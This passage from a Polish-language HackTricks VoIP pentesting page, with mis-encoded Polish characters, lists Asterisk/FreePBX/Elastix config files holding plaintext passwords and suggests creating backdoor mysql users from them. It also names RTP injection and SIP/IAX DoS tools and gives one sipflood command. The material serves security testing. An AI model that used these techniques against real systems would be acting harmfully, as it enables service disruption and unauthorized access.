* Mo偶e to by wykorzystane do utworzenia nowego u偶ytkownika mysql jako backdoor.
* **`FreePBX`**
* **`amportal.conf`** -> Zawiera haso administratora panelu sieciowego (FreePBX).
* **`FreePBX.conf`** -> Zawiera haso u偶ytkownika FreePBXuser u偶ywane do dostpu do bazy danych.
* Mo偶e to by wykorzystane do utworzenia nowego u偶ytkownika mysql jako backdoor.
* **`Elastix`**
* **`Elastix.conf`** -> Zawiera kilka hase w postaci zwykego tekstu, takich jak haso root mysql, haso IMAPd, haso administratora sieciowego.
* **Kilka folder贸w** bdzie nale偶e do skompromitowanego u偶ytkownika asterisk (jeli nie dziaa jako root). Ten u偶ytkownik mo偶e odczytywa wczeniejsze pliki i kontrolowa konfiguracj, wic mo偶e spowodowa, 偶e Asterisk zaaduje inne binarne pliki backdoorowane podczas wykonywania.

### Wstrzykiwanie RTP

Mo偶liwe jest wstrzyknicie pliku **`.wav`** do rozm贸w za pomoc narzdzi takich jak **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) i **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Lub mo偶na u偶y skrypt贸w z [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) do **skanowania rozm贸w** (**`rtpscan.pl`**), wysyania `.wav` do rozmowy (**`rtpsend.pl`**) i **wstrzykiwania haasu** do rozmowy (**`rtpflood.pl`**).

### Ataki typu DoS

Istnieje kilka sposob贸w pr贸by przeprowadzenia ataku typu DoS na serwery VoIP.

* **`sipflood.py`** z [**sippts**](https://github.com/Pepelux/sippts)**: **_**SipFlood**_ wysya nieograniczon liczb wiadomoci do celu
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Atak DoS na protok贸 IAX u偶ywany przez Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Narzdzie do przeprowadzania ataku typu SIP/SDP INVITE flooding za pomoc UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Wysya kilka poprawnie sformowanych pakiet贸w RTP. Nale偶y zna u偶ywane porty RTP (najpierw podsucha).
* [**SIPp**](https://github.com/SIPp/sipp): Pozwala na analiz i generowanie ruchu SIP. Mo偶e by r贸wnie偶 u偶ywane do atak贸w typu DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Szwajcarski n贸偶 SIP. Mo偶e r贸wnie偶 by u偶ywany do przeprowadzania atak贸w typu SIP.
* Fuzzery: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* **`sipsend.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPSend pozwala nam wysya **niestandardowe wiadomoci SIP** i analizowa odpowied藕.
* **`wssend.py`** z [**sippts**](https://github.com/Pepelux/sippts)**:** WsSend pozwala nam wysya niestandardowe wiadomoci SIP za porednictwem protokou WebSockets i analizowa odpowied藕.

### Podatnoci systemowe

Najprostszym sposobem zainstalowania oprogramowania takiego jak Asterisk jest pobranie dystrybucji systemu operacyjnego, w kt贸rym jest on ju偶 zainstalowany, takich jak: **FreePBX, Elastix, Trixbox**... Problem z tymi dystrybucjami polega na tym, 偶e po uruchomieniu administratorzy systemu mog **nie aktualizowa ich ponownie**, a z czasem zostan odkryte **podatnoci**.

## Odwoania

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
